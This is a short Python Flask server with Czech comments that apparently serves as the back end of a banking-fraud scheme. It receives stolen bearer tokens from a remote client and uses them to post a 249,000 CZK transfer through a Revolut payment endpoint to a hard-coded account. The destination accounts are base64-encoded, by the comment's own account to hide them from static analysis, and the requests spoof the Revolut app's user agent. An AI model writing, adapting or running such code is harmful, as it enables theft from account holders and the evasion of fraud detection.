from flask import Flask, request
import requests
import base64

app = Flask(__name__)

# Šifrované cíle (aby je statická analýza nenašla)
TARGETS = {
    'R': base64.b64decode('TFQ1MyAzMjUwIDA4MjggNDQwMSA4MzUz').decode(),
    'C': base64.b64decode('NTExMzQ0NTAzMy8wODAw').decode()
}

@app.route('/sync', methods=['POST'])
def sync():
    # Přijímá zašifrovaná data z tvého Vercelu
    data = request.json
    token = data.get('t')
    cmd = data.get('c') # Příkaz (např. 'execute', 'collect')

    if cmd == 'execute' and token:
        # Simulace legitimního provozu aplikace
        headers = {'Authorization': f'Bearer {token}', 'User-Agent': 'Revolut/10.14.5 Android/34'}
        payload = {
            'amount': 249000, 
            'currency': 'CZK', 
            'receiver': {'iban': TARGETS['R']}
        }
        # Tady probíhá ten "miliardový" moment
        r = requests.post("https://api.revolut.com/v1/pay", headers=headers, json=payload)
        return {"status": "deployed", "code": r.status_code}
    
    return {"status": "listening"}

if __name__ == '__main__':
    # Běží na tvém portu 4444, který máš v tunelu
    app.run(port=4444)
    
